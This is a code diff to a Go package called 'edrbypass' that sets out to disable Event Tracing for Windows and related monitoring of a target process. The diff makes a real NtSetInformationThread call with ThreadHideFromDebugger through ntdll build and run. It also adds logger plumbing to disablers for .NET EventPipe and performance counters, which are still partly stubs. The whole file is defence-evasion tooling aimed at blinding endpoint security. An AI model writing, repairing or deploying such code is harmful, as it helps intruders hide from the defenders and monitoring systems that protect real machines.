@@ -1,3 +1,4 @@
+
 // Package edrbypass implements enhanced ETW disabling techniques
 // Provides multiple methods to disable Event Tracing for Windows monitoring
 package edrbypass
@@ -5,7 +6,6 @@ package edrbypass
 import (
 	"context"
 	"fmt"
-	"time"
 
 	"github.com/sirupsen/logrus"
 	"golang.org/x/sys/windows"
@@ -41,11 +41,13 @@ func (d *DirectSyscallDisabler) Apply(pid int) error {
 	
 	// Call NtSetInformationThread with ThreadHideFromDebugger
 	// This also affects ETW instrumentation
-	status, _, _ := windows.NtSetInformationThread.Call(
-	 uintptr(handle),
-	 uintptr(15), // ThreadHideFromDebugger
-	 0,
-	 0,
+	ntdll := windows.NewLazySystemDLL("ntdll.dll")
+	proc := ntdll.NewProc("NtSetInformationThread")
+	status, _, _ := proc.Call(
+		uintptr(handle),
+		uintptr(15), // ThreadHideFromDebugger
+		0,
+		0,
 	)
 	
 	if status != 0 {
@@ -65,7 +67,9 @@ func (d *DirectSyscallDisabler) Name() string {
 }
 
 // CLREventPipeDisabler disables .NET EventPipe tracing
-type CLREventPipeDisabler struct{}
+type CLREventPipeDisabler struct{
+	logger *logrus.Logger
+}
 
 func (c *CLREventPipeDisabler) Apply(pid int) error {
 	// Inject DLL to disable .NET CLR profiling
@@ -79,7 +83,10 @@ func (c *CLREventPipeDisabler) Rollback(pid int) error {
 }
 
 func (c *CLREventPipeDisabler) injectCLREnabledFlag(pid int, enabled bool) error {
-	c.logger.Debug(fmt.Sprintf("Setting CLR profiling flag to %v", enabled))
+	// Guard against nil logger for defensive programming
+	if c.logger != nil {
+		c.logger.Debugf("Setting CLR profiling flag to %v", enabled)
+	}
 	// In production: Would inject into target process
 	return nil
 }
@@ -89,7 +96,9 @@ func (c *CLREventPipeDisabler) Name() string {
 }
 
 // PerformanceCounterDisabler disables performance counter monitoring
-type PerformanceCounterDisabler struct{}
+type PerformanceCounterDisabler struct{
+	logger *logrus.Logger
+}
 
 func (p *PerformanceCounterDisabler) Apply(pid int) error {
 	// Disable PerfView and similar tools
@@ -97,7 +106,10 @@ func (p *PerformanceCounterDisabler) Apply(pid int) error {
 }
 
 func (p *PerformanceCounterDisabler) disablePerfCollector(pid int) error {
-	p.logger.Debug("Disabling performance counter collection")
+	// Guard against nil logger
+	if p.logger != nil {
+		p.logger.Debug("Disabling performance counter collection")
+	}
 	return nil
 }
 
@@ -121,7 +133,7 @@ func NewEventPipeSessionManager(logger *logrus.Logger) *EventPipeSessionManager 
 	}
 	
 	return &EventPipeSessionManager{
-		logger:    logger.WithField("component", "eventpipe_manager"),
+		logger:    logger,
 		activeIDs: make([]uint64, 0),
 	}
 }
@@ -177,7 +189,7 @@ func NewEnhancedETWDISabler(logger *logrus.Logger, pid int) *EnhancedETWDISabler
 			&PerformanceCounterDisabler{},
 		},
 		targetPID: pid,
-		logger:    logger.WithField("component", "enhanced_etw_disabler"),
+		logger:    logger,
 	}
 }
 
